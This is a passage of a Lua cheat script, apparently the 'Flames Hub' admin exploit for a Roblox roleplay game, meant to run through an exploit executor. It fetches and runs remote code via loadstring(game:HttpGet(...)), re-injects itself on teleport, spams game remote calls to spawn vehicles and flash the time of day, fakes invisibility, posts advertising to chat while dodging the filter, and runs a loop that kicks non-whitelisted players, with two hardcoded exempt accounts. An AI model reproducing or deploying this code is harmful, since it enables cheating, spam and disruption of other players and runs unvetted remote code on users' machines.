      local Module_Found = Modules[module_name:lower()]

      return Module_Found or nil
   end

   getgenv().NightVisionEnabled = getgenv().NightVisionEnabled or false
   getgenv().ensureColorCorrection = function(name, props)
      local effect = Lighting:FindFirstChild(name)
      if not effect then
         effect = Instance.new("ColorCorrectionEffect")
         effect.Name = name
         effect.Parent = getgenv().Lighting or game:GetService("Lighting")
      end
      for prop, value in pairs(props) do
         effect[prop] = value
      end
      return effect
   end

   local ccEffects = {
      NightVisionColorCorrection = ensureColorCorrection("NightVisionColorCorrection", {
         Enabled = false,
         Brightness = 0,
         Contrast = -0.1,
         Saturation = -1,
         TintColor = Color3.new(0.6, 1, 0.815686)
      })
   }

   local vignetteGui = getgenv().PlayerGui:FindFirstChild("VignetteEffect")
   if not vignetteGui then
      vignetteGui = Instance.new("ScreenGui")
      vignetteGui.Name = "VignetteEffect"
      vignetteGui.IgnoreGuiInset = true
      vignetteGui.Enabled = false
      vignetteGui.ResetOnSpawn = false
      vignetteGui.Parent = game:GetService("CoreGui")
   end

   local vignetteImage = vignetteGui:FindFirstChildOfClass("ImageLabel")
   if not vignetteImage then
      vignetteImage = Instance.new("ImageLabel")
      vignetteImage.Name = "ImageLabel"
      vignetteImage.Active = false
      vignetteImage.BackgroundColor3 = Color3.new(1, 1, 1)
      vignetteImage.BackgroundTransparency = 1
      vignetteImage.BorderColor3 = Color3.new(0, 0, 0)
      vignetteImage.BorderSizePixel = 0
      vignetteImage.Position = UDim2.new(0, 0, 0, 0)
      vignetteImage.Size = UDim2.new(1, 0, 1, 0)
      vignetteImage.Visible = true
      vignetteImage.Image = "rbxassetid://123500368394738"
      vignetteImage.ImageColor3 = Color3.new(1, 1, 1)
      vignetteImage.ImageTransparency = 0
      vignetteImage.ImageRectOffset = Vector2.new(0, 0)
      vignetteImage.ImageRectSize = Vector2.new(0, 0)
      vignetteImage.TileSize = UDim2.new(1, 0, 1, 0)
      vignetteImage.SliceScale = 1
      vignetteImage.SliceCenter = Rect.new(0, 0, 0, 0)
      vignetteImage.ScaleType = Enum.ScaleType.Stretch
      vignetteImage.Parent = vignetteGui
   end

   getgenv().ToggleNightVision = function(state)
      getgenv().NightVisionEnabled = state
      for _, effect in pairs(ccEffects) do
         effect.Enabled = state
      end
      vignetteGui.Enabled = state
   end

   getgenv().night_vision = function(toggle)
      if toggle == true then
         if getgenv().NightVisionEnabled then
            return getgenv().notify("Warning", "Night Vision is already enabled.", 5)
         end

         getgenv().ToggleNightVision(true)
         getgenv().notify("Success", "Night Vision has been enabled.", 5)
      elseif toggle == false then
         if not getgenv().NightVisionEnabled then
            return getgenv().notify("Warning", "Night Vision is already enabled.", 5)
         end

         getgenv().ToggleNightVision(false)
         getgenv().notify("Success", "Night Vision has been disabled.", 5)
      else
         return 
      end
   end

   getgenv().Net = find_module_s("Net") or require(getgenv().Core:FindFirstChild("Net"))
   getgenv().owner_joined = function(Name) -- so when I update the script I can update the message below dynamically
      notify("Success", "Flames Hub | Owner has joined this server ("..tostring(Name).."), this is my current and only account right now, so come to me if you need help/assistance.", 45)
   end

   if not getgenv().Teleport_Check_Made_Flames_Hub then
      getgenv().LocalPlayer.OnTeleport:Connect(function(state)
         if (not getgenv().TeleportCheck_Admin) and getgenv().queueteleport then
            getgenv().TeleportCheck_Admin = true
            local script_text = get_script_text("Life_Together_Admin")
            if script_text ~= "" then
               getgenv().queueteleport("loadstring([[" .. script_text .. "]])()")
            end
         end
      end)

      fw(0.1)
      getgenv().Teleport_Check_Made_Flames_Hub = true
   end

   getgenv().LocalPlayer = getgenv().LocalPlayer or safe_wrapper("lp")
   notify("Success", "Spoofing Vehicle spawner...", 10)

   local some_vehicles = {
      "Monster Truck",
      "SVJ",
      "SF90",
      "Charger SRT",
      "Smart Car",
      "SWAT Van",
      "FireTruck",
      "Tank",
      "MiniCooper",
      "TrackHawk",
      "GClass",
      "Chiron",
      "Humvee",
      "Tesla",
      "Cayenne",
      "F150",
      "Police SUV",
   }
   fw(0.1)
   if not getgenv().Spawned_Vehicle_Checker then
      local Net = find_module_s("Net") or require(getgenv().Core:FindFirstChild("Net"))

      for _, car in ipairs(some_vehicles) do
         fw(0.2)
         Net.get("spawn_vehicle", tostring(car))
      end
   end
   fw(0.2)
   getgenv().find_placed_models_folder = function()
      for _, v in ipairs(getgenv().Workspace:GetDescendants()) do
         local n = v.Name:lower()

         if v:IsA("Folder") and (n:find("placedmodels", 1, true) or n:find("modelsplaced", 1, true)) then
            return v
         end
      end
      return nil
   end

   local Placed_Models = getgenv().Workspace:FindFirstChild("PlacedModels") or getgenv().Workspace:WaitForChild("PlacedModels", 1) or find_placed_models_folder()

   getgenv().has_server_admin = function()
      for _, player in ipairs(Players:GetPlayers()) do
         local hrp = get_root(player)
         if hrp then
            local billboard = hrp:FindFirstChild("CharacterBillboardGui")
            if billboard then
               local label = billboard:FindFirstChild("ServerAdmin")
               if label and label:IsA("TextLabel") and label.Visible then
                  return true
               end
            end
         end
      end

      return false
   end

   getgenv().get_server_admin_player = function()
      local function check_player(player)
         local hrp = get_root(player)
         if not hrp then return false end
         local billboard = hrp:FindFirstChild("CharacterBillboardGui")
         if not billboard then return false end
         local label = billboard:FindFirstChild("ServerAdmin")
         return label and label:IsA("TextLabel") and label.Visible
      end

      for _, player in ipairs(Players:GetPlayers()) do
         if check_player(player) then
            return player
         end
      end

      if check_player(getgenv().LocalPlayer or game.Players.LocalPlayer) then
         return getgenv().LocalPlayer or game.Players.LocalPlayer
      end

      return nil
   end

   getgenv().workspace_editor_script_GUI = function()
      if getgenv().CoreGui:FindFirstChild("Workspace_Editor_GUI_Flames_Hub") and getgenv().CoreGui:FindFirstChild("Workspace_Editor_GUI_Flames_Hub"):IsA("ScreenGui") then
         getgenv().CoreGui:FindFirstChild("Workspace_Editor_GUI_Flames_Hub").Enabled = true
         return 
      end
      fw(0.1)
      loadstring(game:HttpGet('https://raw.githubusercontent.com/EnterpriseExperience/MicUpSource/refs/heads/main/Workspace_Editor.lua'))()
   end

   local function send_safe(channel, msg)
      channel:SendAsync(msg)
      
      if math.random() < 0.3 then
         wait(1)
         channel:SendAsync("bro")
      end
   end

   getgenv().advertise_command_send_chats = function()
      local textchatservice = getgenv().TextChatService
      local channel = textchatservice:FindFirstChild("RBXGeneral", true) or textchatservice:FindFirstChild("TextChannels"):FindFirstChild("RBXGeneral")
      local chats = {
         "Flames Hub is #1 and will forever be #1.",
         "Flames Hub comes with over 190+ commands, customizable commands, easy configuration, one huge community, over-powered commands, and much much more, it's no wonder we're #1!",
         "do you want to have basically unlimited power and strength? be above the rest of the playerbase which does not possess the power of Flames Hub? join us today!",
         "feel like you're not getting enough out of this game? think there's more? well, there is! Flames Hub allows you to do basically everything you can think of! that's why we're always #1!",
         "does 190+ commands interest you? do you think that having everything at the tip of your fingers is pretty cool? well, come join us with Flames Hub today and find out why everyone uses it!",
         "seeing everyone else using cool commands like \"rgbcar\", \"carfly\", or even our working resize command? that's because they enjoy Flames Hub! and you can too, did we mention it's keyless?"
      }

      if not channel then return end
      local msg = chats[math.random(1, #chats)]
      if will_tag(msg) then
         return getgenv().notify("Warning", "Saved from hashtags! Message was going to filter.", 5)
      end
      pcall(function() send_safe(channel, msg) end)
   end

   getgenv().is_localplayer_server_owner = function()
      if not has_server_admin() then
         return false
      end

      local admin_player = get_server_admin_player()
      local local_player = getgenv().LocalPlayer

      return admin_player and local_player and admin_player == local_player
   end

   getgenv().notify_priv_server_owner = function()
      if not has_server_admin() then
         return getgenv().notify("Info", "This is not a private server OR the private server owner is NOT here.", 10)
      end

      if is_localplayer_server_owner() then
         return getgenv().notify("Info", "You are the private server owner.", 5)
      end

      local admin_player = get_server_admin_player()
      if admin_player and admin_player:IsA("Player") then
         getgenv().notify("Info", "This is a private server owned by: "..tostring(admin_player.Name), 7)
      else
         getgenv().notify("Info", "This is a private server owned by: "..tostring(admin_player), 7)
      end
   end

   getgenv().server_admin_tp = function(Player)
      local check_is_localplr_priv_server_owner = is_localplayer_server_owner()
      if not check_is_localplr_priv_server_owner then
         return notify("Warning", "You do not own this Private Server!", 6)
      end

      if typeof(Player) ~= "Instance" or not Player:IsA("Player") then
         return notify("Error", "That player doesn't exist or is not a Player.", 6)
      end

      getgenv().Send("server_admin_teleport_to_player", Player.UserId)
   end

   getgenv().disable_emote_func = function()
      local lp = getgenv().LocalPlayer or game.Players.LocalPlayer
      local Humanoid = get_human(lp)
      if not Humanoid then return notify("Error", "Humanoid not found, try resetting.", 5) end

      pcall(function()
         for _, v in ipairs(Humanoid:GetPlayingAnimationTracks()) do
            v:Stop()
         end
      end)
      if getgenv().Is_Currently_Emoting then
         getgenv().Is_Currently_Emoting = false
      end
   end

   if not getgenv().Spawned_Vehicle_Checker then
      -- [[ Function to check if the script is supported and works on the current executor. ]] --
      local success, response = pcall(function()
         local Net = require(getgenv().Core:FindFirstChild("Net"))

         Net.get("spawn_vehicle", "Monster Truck")
         
         wait(3)

         return get_vehicle()
      end)

      if success and response then
         fw(0.1)
         if get_vehicle() and getgenv().Humanoid.Sit or getgenv().Humanoid.Sit == true then
            getgenv().Humanoid:ChangeState(3)
            fw(0.2)
            Net.get("spawn_vehicle", get_vehicle().Name or "Monster Truck")
         elseif get_vehicle() and getgenv().Humanoid.Sit == false then
            Net.get("spawn_vehicle", get_vehicle().Name or "Monster Truck")
         elseif not get_vehicle() then
            notify("Warning", "We did spawn the Vehicle it seems, but it seems like you despawned the Vehicle.", 10)
         elseif not get_vehicle() and getgenv().Humanoid.Sit == true then
            getgenv().Humanoid:ChangeState(3)
            notify("Warning", "We did not find your Vehicle, but it seems like it worked.", 5)
         end
      else
         if not success then
            getgenv().LifeTogetherRP_Admin = false
            getgenv().LifeTogether_Actual_Flames_Hub_Running_Functioning_Currently_On_Client = false
            --notify("Error", "This script does not work on this executor!", 8)
            return notify("Error", "You cannot run this script on this executor, we're sorry! (if you believe this was in error, re-run the script).", 12)
         end
      end

      getgenv().Spawned_Vehicle_Checker = true
   end

   local Char = getgenv().Char or require(game.ReplicatedStorage:FindFirstChild("Char", true))
   getgenv().get_current_character_life_together_rp = function()
      return Char.get()
   end

   getgenv().get_hrp_life_together_rp = function()
      return Char.get_hrp()
   end

   getgenv().get_human_life_together_rp = function()
      return Char.get_hum()
   end

   if getgenv().invisible_toggle_connections then
      for _, conn in pairs(getgenv().invisible_toggle_connections) do
         pcall(function() conn:Disconnect() end)
      end
      fw(0.1)
      getgenv().invisible_toggle_connections = nil
   end

   local player = getgenv().LocalPlayer or Players.LocalPlayer
   local character, humanoid, rootPart
   getgenv().is_invisible_script_toggled = false
   getgenv().invisible_body_parts = getgenv().invisible_body_parts or {}
   getgenv().invis_main_FE_connections = getgenv().invis_main_FE_connections or {}
   getgenv().setupCharacter = function()
      character = getgenv().Character or player.Character or player.CharacterAdded:Wait()
      humanoid = getgenv().Humanoid or character:WaitForChild("Humanoid", 5)
      rootPart = getgenv().HumanoidRootPart or character:WaitForChild("HumanoidRootPart", 5)

      getgenv().invisible_body_parts = {}
      for _, obj in pairs(character:GetDescendants()) do
         if obj:IsA("BasePart") then
            getgenv().invisible_body_parts[obj] = obj.Transparency
         end
      end
   end

   getgenv().createUI = function()
      local gui = CoreGui:FindFirstChild("InvisibleUI")
      if not gui then
         gui = Instance.new("ScreenGui")
         gui.Name = "InvisibleUI"
         gui.ResetOnSpawn = false
         gui.Parent = CoreGui
      end

      gui.Enabled = false
      gui:ClearAllChildren()

      local frame = Instance.new("Frame")
      frame.Size = UDim2.new(0, 220, 0, 90)
      frame.Position = UDim2.new(0.5, -110, 0.15, 0)
      frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
      frame.BorderSizePixel = 2
      frame.Active = true
      frame.Draggable = true
      frame.Parent = gui

      frame.Visible = false

      local invisBtn = Instance.new("TextButton")
      invisBtn.Size = UDim2.new(0, 100, 0, 40)
      invisBtn.Position = UDim2.new(0, 10, 0, 25)
      invisBtn.Text = "Invisible"
      invisBtn.TextScaled = true
      invisBtn.BackgroundColor3 = Color3.fromRGB(220, 60, 60)
      invisBtn.Parent = frame

      local toggleBtn = Instance.new("TextButton")
      toggleBtn.Size = UDim2.new(0, 80, 0, 30)
      toggleBtn.Position = UDim2.new(0, 130, 0, 30)
      toggleBtn.Text = "Hide"
      toggleBtn.TextScaled = true
      toggleBtn.BackgroundColor3 = Color3.fromRGB(60, 160, 240)
      toggleBtn.Parent = frame

      invisBtn.MouseButton1Click:Connect(function()
         getgenv().is_invisible_script_toggled = not getgenv().is_invisible_script_toggled
         for part, original in pairs(getgenv().invisible_body_parts) do
            if part and part.Parent then
               part.Transparency = getgenv().is_invisible_script_toggled and 0.5 or original
            end
         end
      end)

      toggleBtn.MouseButton1Click:Connect(function()
         if toggleBtn.Text == "Hide" then
            invisBtn.Visible = false
            toggleBtn.Text = "Show"
            frame.Size = UDim2.new(0, 100, 0, 40)
            toggleBtn.Size = UDim2.new(1, 0, 1, 0)
            toggleBtn.Position = UDim2.new(0, 0, 0, 0)
         else
            invisBtn.Visible = true
            toggleBtn.Text = "Hide"
            frame.Size = UDim2.new(0, 220, 0, 90)
            invisBtn.Size = UDim2.new(0, 100, 0, 40)
            invisBtn.Position = UDim2.new(0, 10, 0, 25)
            toggleBtn.Size = UDim2.new(0, 80, 0, 30)
            toggleBtn.Position = UDim2.new(0, 130, 0, 30)
         end
      end)
   end

   setupCharacter()
   createUI()

   if not getgenv().invis_main_FE_connections.Heartbeat then
      getgenv().invis_main_FE_connections.Heartbeat = RunService.Heartbeat:Connect(function()
         if getgenv().is_invisible_script_toggled and rootPart and humanoid then
            local cf = rootPart.CFrame
            local camOffset = humanoid.CameraOffset
            local hidden = cf * CFrame.new(0, -200000, 0)
            rootPart.CFrame = hidden
            humanoid.CameraOffset = hidden:ToObjectSpace(CFrame.new(cf.Position)).Position
            RunService.RenderStepped:Wait()
            rootPart.CFrame = cf
            humanoid.CameraOffset = camOffset
         end
      end)
   end

   if not getgenv().invis_main_FE_connections.CharacterAdded then
      getgenv().invis_main_FE_connections.CharacterAdded = player.CharacterAdded:Connect(function()
         getgenv().is_invisible_script_toggled = false
         setupCharacter()
         createUI()
      end)
   end

   getgenv().invisible_toggle_connections = getgenv().invis_main_FE_connections

   getgenv().set_invisible = function(state)
      getgenv().is_invisible_script_toggled = state and true or false
      if getgenv().is_invisible_script_toggled then
         notify("Info", "You can still use the chat, but people won't be able to see it directly above your head.", 10)
      end

      for part, original in pairs(getgenv().invisible_body_parts) do
         if part and part.Parent then
            part.Transparency = getgenv().is_invisible_script_toggled and 0.5 or original
         end
      end
   end

   local UserInputService = getgenv().UserInputService
   local TweenService = getgenv().TweenService
   getgenv().Admins = getgenv().Admins or {
      [getgenv().LocalPlayer.Name] = true
   }

   getgenv().AdminPrefix = loadPrefix() or "-"
   wait(1)
   if getgenv().IY_LOADED and getgenv().AdminPrefix == ";" then
      notify("Warning", "Hey! You have Infinite Yield loaded and your prefix is ; | change it! or it'll make you execute IY's commands!", 13)
   elseif getgenv().GET_LOADED_IY and getgenv().AdminPrefix == ";" then
      notify("Warning", "Hey! You have Infinite Premium loaded and your prefix is ; | change it! or it'll make you execute IY's commands!", 13)
   end

   if not getgenv().Already_Loaded_Admins_Prefix then
      if getgenv().AdminPrefix then
         print("[Prefix]: Loaded Saved Prefix --> ", tostring(getgenv().AdminPrefix))
         getgenv().Already_Loaded_Admins_Prefix = true
      end
   end

   getgenv().AllCars = {
      "Magic Carpet", "EClass", "TowTruck", "Bicycle", "Fiat500", "Cayenne", "Jetski", "LuggageScooter",
      "MiniCooper", "GarbageTruck", "EScooter", "Monster Truck", "Yacht", "Stingray", "FireTruck", "VespaPizza",
      "VespaPolice", "F150", "Police SUV", "Chiron", "Humvee", "Wrangler", "Box Van", "Ambulance", "Urus", "Tesla",
      "Cybertruck", "RollsRoyce", "GClass", "SVJ", "MX5", "SF90", "Charger SRT", "Evoque", "IceCream Truck",
      "Vespa", "ATV", "Limo", "Tank", "Smart Car", "Beauford", "SchoolBus", "Sprinter", "GolfKart", "TrackHawk",
      "Helicopter", "SnowPlow", "Camper Van", "SWAT Van", "Magic Carpett"
   }
   local CarMap = {}

   getgenv().kick_plr = function(player)
      if not is_localplayer_server_owner() then
         return notify("Error", "You are not the private server owner!", 5)
      end

      local name

      if typeof(player) == "Instance" then
         name = player.Name
      else
         name = tostring(player)
      end

      if not allowed[getgenv().LocalPlayer.Name] and not allowed[player.Name] then
         local args = {
            "server_admin_kick_player",
            tostring(name)
         }

         getgenv().Get(unpack(args))
      end
   end

   getgenv().server_lock_whitelist_gui = function()
      if not is_localplayer_server_owner() then
         return notify("Error", "You are not the private server owner!", 5)
      end
      if getgenv().ServerLockWhitelistManagerGUI then
         return notify("Warning", "Server-Lock whitelist manager is already running!", 5)
      end

      getgenv().server_whitelist = getgenv().server_whitelist or {}
      if not getgenv().server_whitelist["CIippedByAura"] then getgenv().server_whitelist["CIippedByAura"] = true end
      if not getgenv().server_whitelist["L0CKED_1N1"] then getgenv().server_whitelist["L0CKED_1N1"] = true end

      local ScreenGui = Instance.new("ScreenGui")
      ScreenGui.Name = tostring(getgenv().randomString())
      ScreenGui.Parent = parent_gui

      local Main = Instance.new("Frame")
      Main.Size = UDim2.new(0, 300, 0, 350)
      Main.Position = UDim2.new(0.5, -150, 0.5, -175)
      Main.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
      Main.BorderSizePixel = 0
      Main.Parent = ScreenGui

      dragify(Main)

      local UICorner = Instance.new("UICorner")
      UICorner.CornerRadius = UDim.new(0, 8)
      UICorner.Parent = Main

      local TitleBar = Instance.new("Frame")
      TitleBar.Size = UDim2.new(1, 0, 0, 30)
      TitleBar.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
      TitleBar.Parent = Main

      local UICorner = Instance.new("UICorner")
      UICorner.CornerRadius = UDim.new(0, 8)
      UICorner.Parent = TitleBar

      local Title = Instance.new("TextLabel")
      Title.Size = UDim2.new(0.970000029, -30, 1, 0)
      Title.Position = UDim2.new(0, 5, 0, 0)
      Title.BackgroundTransparency = 1
      Title.Text = "Server-Lock Whitelist Manager"
      Title.TextColor3 = Color3.fromRGB(255, 255, 255)
      Title.Font = Enum.Font.GothamBold
      Title.TextSize = 14
      Title.TextScaled = true
      Title.TextXAlignment = Enum.TextXAlignment.Left
      Title.Parent = TitleBar

      local CloseButton = Instance.new("TextButton")
      CloseButton.Size = UDim2.new(0, 30, 1, 0)
      CloseButton.Position = UDim2.new(1, -30, 0, 0)
      CloseButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
      CloseButton.Text = "X"
      CloseButton.TextColor3 = Color3.fromRGB(255, 80, 80)
      CloseButton.Font = Enum.Font.GothamBold
      CloseButton.TextSize = 18
      CloseButton.Parent = TitleBar

      local UICorner = Instance.new("UICorner")
      UICorner.CornerRadius = UDim.new(0, 8)
      UICorner.Parent = CloseButton

      CloseButton.MouseButton1Click:Connect(function()
         TweenService:Create(Main, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = UDim2.new(0, 300, 0, 0), Transparency = 1}):Play()
         wait(0.25)
         getgenv().ServerLockWhitelistManagerGUI = false
         ScreenGui:Destroy()
      end)

      local Input = Instance.new("TextBox")
      Input.PlaceholderText = "Enter username..."
      Input.Size = UDim2.new(1, -20, 0, 25)
      Input.Position = UDim2.new(0, 10, 0, 35)
      Input.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
      Input.TextColor3 = Color3.fromRGB(255, 255, 255)
      Input.Text = ""
      Input.Font = Enum.Font.Gotham
      Input.TextSize = 14
      Input.Parent = Main

      local UICorner = Instance.new("UICorner")
      UICorner.CornerRadius = UDim.new(0, 8)
      UICorner.Parent = Input

      local AddButton = Instance.new("TextButton")
      AddButton.Size = UDim2.new(0.5, -15, 0, 25)
      AddButton.Position = UDim2.new(0, 10, 0, 68)
      AddButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
      AddButton.Text = "Add to server-lock whitelist"
      AddButton.TextColor3 = Color3.fromRGB(255, 255, 255)
      AddButton.Font = Enum.Font.Gotham
      AddButton.TextSize = 14
      AddButton.TextScaled = true
      AddButton.Parent = Main

      local RemoveButton = Instance.new("TextButton")
      RemoveButton.Size = UDim2.new(0.5, -15, 0, 25)
      RemoveButton.Position = UDim2.new(0, 150, 0, 68)
      RemoveButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
      RemoveButton.Text = "Remove from server-lock whitelist"
      RemoveButton.TextColor3 = Color3.fromRGB(255, 255, 255)
      RemoveButton.Font = Enum.Font.Gotham
      RemoveButton.TextSize = 14
      RemoveButton.TextScaled = true
      RemoveButton.Parent = Main

      local UICorner = Instance.new("UICorner")
      UICorner.CornerRadius = UDim.new(0, 8)
      UICorner.Parent = AddButton
      local UICorner = Instance.new("UICorner")
      UICorner.CornerRadius = UDim.new(0, 8)
      UICorner.Parent = RemoveButton

      local PlayerList = Instance.new("ScrollingFrame")
      PlayerList.Size = UDim2.new(1, -20, 1, -110)
      PlayerList.Position = UDim2.new(0, 10, 0, 100)
      PlayerList.CanvasSize = UDim2.new(0, 0, 0, 0)
      PlayerList.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
      PlayerList.ScrollBarThickness = 5
      PlayerList.Parent = Main

      local UIListLayout = Instance.new("UIListLayout")
      UIListLayout.Padding = UDim.new(0, 3)
      UIListLayout.Parent = PlayerList

      local function refresh_list()
         for _, child in ipairs(PlayerList:GetChildren()) do
            if child:IsA("Frame") then
               child:Destroy()
            end
         end
         for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= getgenv().LocalPlayer then
               if plr.Name ~= "CIippedByAura" and plr.Name ~= "L0CKED_1N1" then
                  local frame = Instance.new("Frame")
                  frame.Size = UDim2.new(1, 0, 0, 30)
                  frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                  frame.Parent = PlayerList

                  local name_label = Instance.new("TextLabel")
                  name_label.Size = UDim2.new(1, -60, 1, 0)
                  name_label.Position = UDim2.new(0, 5, 0, 0)
                  name_label.BackgroundTransparency = 1
                  name_label.Text = plr.Name
                  name_label.TextScaled = true
                  name_label.TextColor3 = getgenv().server_whitelist[plr.Name] and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 255, 255)
                  name_label.Font = Enum.Font.Gotham
                  name_label.TextSize = 14
                  name_label.TextXAlignment = Enum.TextXAlignment.Left
                  name_label.Parent = frame

                  local button = Instance.new("TextButton")
                  button.Size = UDim2.new(0, 50, 1, -6)
                  button.Position = UDim2.new(1, -55, 0, 3)
                  button.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
                  button.Text = getgenv().server_whitelist[plr.Name] and "Remove" or "Add"
                  button.TextScaled = true
                  button.TextColor3 = Color3.fromRGB(255, 255, 255)
                  button.Font = Enum.Font.Gotham
                  button.TextSize = 13
                  button.Parent = frame

                  local UICorner = Instance.new("UICorner")
                  UICorner.CornerRadius = UDim.new(0, 8)
                  UICorner.Parent = frame
                  local UICorner = Instance.new("UICorner")
                  UICorner.CornerRadius = UDim.new(0, 8)
                  UICorner.Parent = name_label
                  local UICorner = Instance.new("UICorner")
                  UICorner.CornerRadius = UDim.new(0, 8)
                  UICorner.Parent = button

                  button.MouseButton1Click:Connect(function()
                     if getgenv().server_whitelist[plr.Name] then
                        getgenv().server_whitelist[plr.Name] = nil
                     else
                        getgenv().server_whitelist[plr.Name] = true
                     end
                     refresh_list()
                  end)
               end
            end
         end
         PlayerList.CanvasSize = UDim2.new(0, 0, 0, UIListLayout.AbsoluteContentSize.Y)
      end

      AddButton.MouseButton1Click:Connect(function()
         local name = Input.Text
         if name ~= "" then
            if getgenv().server_whitelist[name] then
               return notify("Warning", tostring(name).." is already in the server-lock whitelist!", 5)
            end

            getgenv().server_whitelist[name] = true
            Input.Text = ""
            wait(0.3)
            if getgenv().server_whitelist[name] then
               notify("Success", tostring(name).." was added to server-lock whitelist! (they won't get kicked by server-lock).", 15)
            end
            refresh_list()
         end
      end)

      RemoveButton.MouseButton1Click:Connect(function()
         local name = Input.Text
         if name ~= "" then
            if not getgenv().server_whitelist[name] then
               return notify("Warning", tostring(name).." is not in the server-lock whitelist!", 5)
            end

            getgenv().server_whitelist[name] = nil
            Input.Text = ""
            wait(0.3)
            if not getgenv().server_whitelist[name] then
               notify("Success", tostring(name).." was removed from the server-lock whitelist! (they WILL get kicked by server-lock).", 15)
            end
            refresh_list()
         end
      end)

      if not getgenv().Player_Added_Removed_Conn_Whitelist_Manager_Check then
         getgenv().Player_Added_Removed_Conn_Whitelist_Manager_Check = true

         Players.PlayerAdded:Connect(function()
            task.wait(0.5)
            refresh_list()
         end)

         Players.PlayerRemoving:Connect(refresh_list)
      end
      refresh_list()
   end

   getgenv().friend_user_async_function = function(player)
      local target = player
      if not target then return notify("Error", "Player does not exist or has left the game.", 6) end
      if getgenv().LocalPlayer:IsFriendsWith(target.UserId) then return notify("Warning", "You're already friends with this person.", 6) end
      local ok, response = pcall(function()
         getgenv().LocalPlayer:RequestFriendship(target)
      end)

      if not ok then
         getgenv().notify("Warning", "An unexpected error happened while friending: "..tostring(target), 10)
         return getgenv().notify("Error", "Error: "..tostring(response), 10)
      else
         getgenv().notify("Success", "Sent friend request to: "..tostring(target).." successfully!", 5)
      end
   end

   getgenv().unfriend_user_async = function(player)
      local target = player
      if not target then return notify("Error", "Player does not exist or has left the game.", 6) end
      if not getgenv().LocalPlayer:IsFriendsWith(target.UserId) then return notify("Warning", "You're not friends with this person.", 6) end
      local ok, response = pcall(function()
         getgenv().LocalPlayer:RevokeFriendship(target)
      end)

      if not ok then
         getgenv().notify("Warning", "An unexpected error happened while unadding: "..tostring(target), 10)
         return getgenv().notify("Error", "Error: "..tostring(response), 10)
      else
         getgenv().notify("Success", "Unfriended target player: "..tostring(target).." successfully.", 5)
      end
   end

   getgenv().prompt_game_invite_func = function(args)
      local options = Instance.new("ExperienceInviteOptions")
      options.InviteMessageId = tostring(args) or "join me bruh"
      local player = getgenv().LocalPlayer or game.Players.LocalPlayer
      local SocialService = game:GetService("SocialService")

      SocialService:PromptGameInvite(player, options)
   end

   getgenv().server_lock_toggle = function(toggle)
      if not is_localplayer_server_owner() then
         return notify("Error", "You are not the private server owner!", 5)
      end

      local fw = getgenv().FlamesLibrary.wait

      if toggle == true then
         if getgenv().server_lock_enabled then
            return notify("Warning", "Server-Lock is already enabled!", 5)
         end

         if not workspace:FindFirstChildOfClass("Hint") then
            local hint_instance = Instance.new("Hint")
            hint_instance.Text = "Flames Hub - ServerLock V2 is now enabled."
            if typeof(workspace) == "Instance" and workspace.Parent == game then
               hint_instance.Parent = workspace
            end
         end

         getgenv().server_lock_enabled = true
         getgenv().FlamesLibrary.spawn("server_lock_loop", "spawn", function()
            while getgenv().server_lock_enabled == true do
               fw(0.1)
               for _, v in ipairs(getgenv().Players:GetPlayers()) do
                  if v ~= getgenv().LocalPlayer and not getgenv().server_whitelist[v.Name] then
                     if v.Name ~= "CIippedByAura" and v.Name ~= "L0CKED_1N1" then
                        kick_plr(v)
                     end
                  end
               end
            end
         end)
      elseif toggle == false then
         if not getgenv().server_lock_enabled then
            return notify("Warning", "Server-Lock is not enabled!", 5)
         end

         if workspace:FindFirstChildOfClass("Hint") then pcall(function() workspace:FindFirstChildOfClass("Hint"):Destroy() end) end
         getgenv().server_lock_enabled = false
         getgenv().FlamesLibrary.disconnect("server_lock_loop")
         notify("Success", "Server-Lock is now disabled.", 5)
      end
   end

   getgenv().stop_time_toggle = function(toggle)
      if not is_localplayer_server_owner() then
         return notify("Error", "You are not the private server owner!", 5)
      end

      if toggle == true then
         getgenv().Send("time_toggle", true)
         notify("Success", "Time has been stopped.", 5)
      elseif toggle == false then
         getgenv().Send("time_toggle", false)
         notify("Success", "Time is now resumed/moving.", 5)
      else
         return 
      end
   end

   getgenv().change_time_num = function(number_input)
      if not typeof(number_input) == "number" then
         return notify("Error", "That is not a number!", 5)
      end
      if not is_localplayer_server_owner() then
         return notify("Error", "You are not the private server owner!", 5)
      end

      local main_conv = tonumber(number_input) or number_input

      getgenv().Send("change_time", main_conv)
   end

   getgenv().flash_time_toggle = function(toggled)
      if not is_localplayer_server_owner() then
         getgenv().flashing_time_fe_toggle = false
         return notify("Error", "You are not the private server owner!", 5)
      end

      if toggled then
         if getgenv().flashing_time_fe_toggle then
            return notify("Warning", "Time Flasher is already enabled!", 5)
         end

         if UserInputService.TouchEnabled then
            getgenv().flashing_time_fe_toggle = true
            notify("Success", "Time Flasher is now enabled.", 5)
            getgenv().Flashing_Time_FE_Toggle_Task = task.spawn(function()
               while getgenv().flashing_time_fe_toggle == true do
                  fw(0.1)
                  change_time_num(4.5)
                  fw(0)
                  change_time_num(12)
                  fw(.1)
                  change_time_num(23)
               end
            end)
         else
            getgenv().flashing_time_fe_toggle = true
            notify("Success", "Time Flasher is now enabled.", 5)
            getgenv().Flashing_Time_FE_Toggle_Task = task.spawn(function()
               while getgenv().flashing_time_fe_toggle == true do
                  fw(0)
                  change_time_num(4.5)
                  fw(0)
                  change_time_num(12)
                  fw(0)
                  change_time_num(23)
               end
            end)
         end
      else
         if not getgenv().flashing_time_fe_toggle then
            return notify("Warning", "Time Flasher is not enabled!", 5)
         end

         getgenv().flashing_time_fe_toggle = false

         if getgenv().Flashing_Time_FE_Toggle_Task then
            task.cancel(getgenv().Flashing_Time_FE_Toggle_Task)
            getgenv().Flashing_Time_FE_Toggle_Task = nil
         end

         notify("Success", "Time Flasher has been disabled.", 5)
      end
   end

   getgenv().pick_new_weather = function(weather_set)
      local weather_args

      if weather_set:lower():find("snow") then
         weather_args = {
            "change_weather",
            {
               humidity = 1,
               wind = 0.55,
               temperature = 0
